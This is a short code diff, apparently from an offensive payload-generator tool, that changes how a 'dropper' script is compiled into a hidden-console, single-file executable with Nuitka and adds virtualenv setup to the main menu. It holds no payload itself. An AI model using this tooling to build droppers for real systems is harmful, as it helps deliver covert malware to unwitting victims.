@@ -452,12 +452,25 @@ if __name__ == "__main__":
     except Exception:
         pass
     
-    # Compile dropper
+    # Compile dropper (use venv python if osripper-cli setup was run)
     try:
-        subprocess.run([
-            "python3", "-m", "nuitka", "--standalone", "--include-module=sandboxed",
-            "--disable-console", "--onefile", "--assume-yes-for-downloads", "dropper_or.py"
-        ], check=True)
+        try:
+            from osripper.venv_helper import get_venv_python
+            python = get_venv_python()
+        except Exception:
+            python = "python3"
+        result = subprocess.run(
+            [
+                python, "-m", "nuitka", "--standalone", "--include-module=sandboxed",
+                "--disable-console", "--onefile", "--assume-yes-for-downloads", "dropper_or.py"
+            ],
+            capture_output=True,
+            text=True,
+        )
+        if result.returncode != 0:
+            err = (result.stderr or result.stdout or "")
+            if "No module named" in err or "nuitka" in err:
+                print("[!] Dropper compilation skipped. Run: osripper-cli setup")
     except Exception:
         pass
 
@@ -476,6 +489,8 @@ def start_listener():
 def main():
     """Main application."""
     try:
+        from .venv_helper import ensure_venv_on_path
+        ensure_venv_on_path()
         clear_screen()
         display_logo()
         display_menu()
